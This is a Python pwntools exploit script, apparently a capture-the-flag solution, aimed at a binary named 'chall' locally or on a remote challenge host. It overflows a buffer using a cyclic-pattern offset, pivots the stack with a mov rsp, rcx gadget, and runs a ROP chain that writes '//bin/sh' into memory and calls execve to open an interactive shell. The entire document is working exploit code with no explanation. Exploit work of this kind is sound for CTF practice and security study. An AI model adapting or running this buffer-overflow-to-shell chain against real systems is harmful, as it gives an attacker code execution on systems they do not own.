#!/usr/bin/env python3

from pwn import *
from pwnlib.util.cyclic import cyclic

def conn():
    context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])
    if args.REMOTE:
        p = remote('0.cloud.chals.io', 26620)
    else:
        p = process('./chall')
        gdb.attach(p, '''            
            # b *0x00000000004015e7
            continue
        ''')
    return p

def gen_rop_chain():
    from struct import pack
    p = lambda x : pack('Q', x)
    IMAGE_BASE_0 = 0x0000000000400000 # 2c50de7c1225cc1c139542704af1b4e0eb0ee550abf347c2bc8e31a2e00bb7c9
    rebase_0 = lambda x : p(x + IMAGE_BASE_0)
    rop = b''
    rop += rebase_0(0x0000000000001843) # 0x0000000000401843: pop r13; ret; 
    rop += b'//bin/sh'
    rop += rebase_0(0x0000000000000b16) # 0x0000000000400b16: pop rdi; ret; 
    rop += rebase_0(0x00000000003ba120)
    rop += rebase_0(0x0000000000131af9) # 0x0000000000531af9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000001843) # 0x0000000000401843: pop r13; ret; 
    rop += p(0x0000000000000000)
    rop += rebase_0(0x0000000000000b16) # 0x0000000000400b16: pop rdi; ret; 
    rop += rebase_0(0x00000000003ba128)
    rop += rebase_0(0x0000000000131af9) # 0x0000000000531af9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000000b16) # 0x0000000000400b16: pop rdi; ret; 
    rop += rebase_0(0x00000000003ba120)
    rop += rebase_0(0x00000000000036de) # 0x00000000004036de: pop rsi; ret; 
    rop += rebase_0(0x00000000003ba128)
    rop += rebase_0(0x0000000000023032) # 0x0000000000423032: pop rdx; ret; 
    rop += rebase_0(0x00000000003ba128)
    rop += rebase_0(0x00000000000006df) # 0x00000000004006df: pop rax; ret; 
    rop += p(0x000000000000003b)
    rop += rebase_0(0x000000000013f705) # 0x000000000053f705: syscall; ret; 
    return rop


p = conn()

# 0x000000000049a0d6: mov rsp, rcx; ret; 
rsp_rcx_gadget = 0x000000000049a0d6

# 0x000000000040f7bd: pop r13; pop r14; pop r15; pop rbp; ret; 
pop_4 = 0x000000000040f7bd

pattern = cyclic(0x1000)
offset = pattern.find(b'haafiaaf')
print(f'Offset found at: {offset}')

payload = pattern[:offset-0x10]
payload += pack(pop_4) + pack(0xdeadbeef) + pack(rsp_rcx_gadget) + pack(0xdeadbeef) + pack(0xdeadbeef)
payload += gen_rop_chain()
payload += b'b'*(0x1000 - len(payload))

p.sendline(payload)

p.interactive()

